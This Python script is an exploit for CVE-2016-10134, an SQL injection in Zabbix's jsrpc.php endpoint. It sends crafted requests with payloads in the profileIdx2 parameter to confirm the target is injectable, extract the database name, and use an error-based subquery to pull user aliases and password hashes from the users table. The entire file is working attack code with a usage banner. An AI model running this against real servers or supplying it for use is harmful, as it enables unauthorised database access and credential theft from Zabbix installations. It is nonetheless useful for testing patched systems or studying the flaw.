# coding= utf-8
import sys,re
import requests

def sql_check(last_16_of_sid):
    poc = "/jsrpc.php?sid="+last_16_of_sid+ \
          "&type=9" \
          "&method=screen.get" \
          "&timestamp=1471054088083&mode=2" \
          "&screenid=" \
          "&groupid=&hostid=0" \
          "&pageFile=history.php" \
          "&profileIdx=web.item.graph" \
          "&profileIdx2=2â€™3297" \
          "&updateProfile=true" \
          "&screenitemid=&period=3600" \
          "&stime=20170813040734" \
          "&resourcetype=17" \
          "&itemids%5B23297%5D=23297" \
          "&action=showlatest" \
          "&filter=" \
          "&filter_task=" \
          "&mark_color=1"

    request_url = zabbix_url+poc

    try:
        rsp = requests.get(request_url,timeout=5)
        r = rsp.text
        keyWord = re.findall("INSERT\s*INTO\s*profiles",r)
        if keyWord:
            print("There is an injection at this address")
        else:
            print("This address is not injected and cannot be used")
    except Exception as e:
        print(e)


def get_database(last_16_of_sid):
    payload = "(select database())"
    poc = "/jsrpc.php?sid="+last_16_of_sid+ \
          "&type=9" \
          "&method=screen.get" \
          "&timestamp=1471054088083&mode=2" \
          "&screenid=" \
          "&groupid=&hostid=0" \
          "&pageFile=history.php" \
          "&profileIdx=web.item.graph" \
          "&profileIdx2="+payload+ \
          "&updateProfile=true" \
          "&screenitemid=&period=3600" \
          "&stime=20170813040734" \
          "&resourcetype=17" \
          "&itemids%5B23297%5D=23297" \
          "&action=showlatest" \
          "&filter=" \
          "&filter_task=" \
          "&mark_color=1"
    url = zabbix_url + poc
    try:
        rsp = requests.get(url,timeout=5)
        r = rsp.text
        keyword = re.search('Incorrect.*?(\S+)\s*for',r,re.S)
        print("The database name is:" + keyword.group(1))
    except Exception as e:
        print(e)

def getUserPass(last_16_of_sid):
    payload = "(select 1 from(select count(*)," \
              "concat((select (select (select concat(0x7e,(select concat(alias,0x3a,passwd) " \
              "from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from " \
              "information_schema.tables group by x)a)"
    poc = "/jsrpc.php?sid="+last_16_of_sid +\
          "&type=9" \
          "&method=screen.get" \
          "&timestamp=1471054088083&mode=2" \
          "&screenid=" \
          "&groupid=&hostid=0" \
          "&pageFile=history.php" \
          "&profileIdx=web.item.graph" \
          "&profileIdx2=" + payload + \
          "&updateProfile=true" \
          "&screenitemid=&period=3600" \
          "&stime=20170813040734" \
          "&resourcetype=17" \
          "&itemids%5B23297%5D=23297" \
          "&action=showlatest" \
          "&filter=" \
          "&filter_task=" \
          "&mark_color=1"
    url = zabbix_url+poc
    try:
        rsp = requests.get(url,timeout=5)
        r = rsp.text
        keyword = re.search('Duplicate.*?(\S+)\s*for',r,re.S)
        print("The username and password are:" + keyword.group(1))
    except Exception as e:
        print(e)


if __name__ == '__main__':
    print('*'*60)
    print('\t CVE-2016-10134')
    print('\t Zabbix SQL injection EXP')
    print('\t by https://darkless.cn')
    print('\t python>=3.5 and usage "python zabbix-sql-inject-exp.py"')
    print('*' * 60)
    zabbix_url = "http://127.0.0.1:8081"
    sid = input("Enter your session id: ")
    last_16_of_sid = sid[:-16]
    if not zabbix_url:
        sys.exit()
    sql_check(last_16_of_sid)
    get_database(last_16_of_sid)
    getUserPass(last_16_of_sid)
